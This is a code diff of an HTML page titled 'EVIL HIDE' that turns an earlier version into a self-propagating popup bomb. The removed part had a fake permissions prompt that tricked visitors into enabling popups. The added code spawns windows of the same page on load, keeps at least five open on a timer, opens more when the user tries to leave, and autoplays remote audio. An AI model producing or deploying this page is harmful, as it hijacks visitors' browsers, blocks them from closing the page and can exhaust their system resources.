@@ -1,8 +1,6 @@
-<!DOCTYPE html>
-<head>
+<html><head><base href="/">
   <title>EVIL HIDE</title>
   <style>
-    /* Combined styles */
     body {
       background: #000000;
       color: #ff0000;
@@ -141,94 +139,38 @@
   </style>
 </head>
 <body>
-  <div id="permission-request" class="permission-overlay">
-    <div class="permission-content">
-      <h2>Required Permissions</h2>
-      <p>This site needs certain permissions to continue running.</p>
-      <button id="allow-button">Continue</button>
-    </div>
-  </div>
-
-  <div id="modern-loading" style="display: none;">
-    <div class="loading-content">
-      <div class="evil-text">EVIL HIDE</div>
-      <div class="loader">
-        <div class="progress-bar">
-          <div class="progress"></div>
-        </div>
-        <div class="loading-text">Loading<span class="dots">...</span></div>
-      </div>
-    </div>
-  </div>
-
-  <div id="retro-content" style="display: none;">
-    <div class="floating-text">EVIL HIDE</div>
-  </div>
+  <div class="floating-text">EVIL HIDE</div>
 
   <audio id="bgMusic" loop>
     <source src="https://files.catbox.moe/63a63h.mp3" type="audio/mpeg">
   </audio>
 
   <script>
-    // Combined JavaScript
     let windows = [];
 
     function createNewWindow() {
-      const width = 800;
-      const height = 600;
-      const left = Math.round(Math.random() * (screen.width - width));
-      const top = Math.round(Math.random() * (screen.height - height));
-      
-      const win = window.open(
-        'about:blank',
-        '',
-        `width=${width},height=${height},left=${left},top=${top}`
-      );
-      
-      if (win) {
-        win.document.write(`
-          <!DOCTYPE html>
-          <head>
-            <title>EVIL HIDE</title>
-            <style>
-              body {
-                background: #000000;
-                color: #ff0000;
-                margin: 0;
-                padding: 0;
-                overflow: hidden;
-                height: 100vh;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                font-family: 'Arial Black', sans-serif;
-              }
-              .floating-text {
-                font-size: 4em;
-                color: #ff0000;
-                text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
-                animation: float 2s ease-in-out infinite;
-              }
-              @keyframes float {
-                0% { transform: translateY(0px); }
-                50% { transform: translateY(-20px); }
-                100% { transform: translateY(0px); }
-              }
-            </style>
-          </head>
-          <body>
-            <div class="floating-text">EVIL HIDE</div>
-          </body>
-        `);
-        windows.push(win);
-        win.onbeforeunload = () => {
-          windows = windows.filter(w => !w.closed);
-        };
+      for(let i = 0; i < 3; i++) {
+        const width = 800;
+        const height = 600;
+        const left = Math.round(Math.random() * (screen.width - width));
+        const top = Math.round(Math.random() * (screen.height - height));
+        
+        const win = window.open(
+          window.location.href,
+          '',
+          `width=${width},height=${height},left=${left},top=${top}`
+        );
+        
+        if (win) {
+          windows.push(win);
+          win.onbeforeunload = () => {
+            windows = windows.filter(w => !w.closed);
+          };
+        }
       }
     }
 
     window.onbeforeunload = (e) => {
-      createNewWindow();
       createNewWindow();
       
       e.preventDefault();
@@ -248,50 +190,17 @@
 
     setInterval(() => {
       windows = windows.filter(w => !w.closed);
+      if(windows.length < 5) {
+        createNewWindow();
+      }
     }, 1000);
 
     document.addEventListener('DOMContentLoaded', () => {
-      const permissionRequest = document.getElementById('permission-request');
-      const allowButton = document.getElementById('allow-button');
-      const modernLoading = document.getElementById('modern-loading');
-      const progress = document.querySelector('.progress');
-      const retroContent = document.getElementById('retro-content');
       const audio = document.getElementById('bgMusic');
-
-      allowButton.addEventListener('click', () => {
-        const testPopup = window.open('about:blank', '_blank');
-        if (testPopup) {
-          testPopup.close();
-          permissionRequest.style.display = 'none';
-          modernLoading.style.display = 'flex';
-          startLoading();
-        } else {
-          alert('Please enable popups in your browser settings and try again.');
-        }
-      });
-
-      function startLoading() {
-        let loaded = 0;
-        const interval = setInterval(() => {
-          loaded += Math.random() * 15;
-          if (loaded > 100) {
-            loaded = 100;
-            clearInterval(interval);
-            
-            setTimeout(() => {
-              modernLoading.style.transition = 'opacity 1s';
-              modernLoading.style.opacity = '0';
-              
-              setTimeout(() => {
-                modernLoading.style.display = 'none';
-                retroContent.style.display = 'block';
-                audio.play().catch(e => console.log('Audio autoplay blocked'));
-              }, 1000);
-            }, 500);
-          }
-          progress.style.width = loaded + '%';
-        }, 200);
-      }
+      audio.play().catch(e => console.log('Audio autoplay blocked'));
+      
+      // Create initial windows
+      createNewWindow();
     });
   </script>
 </body>
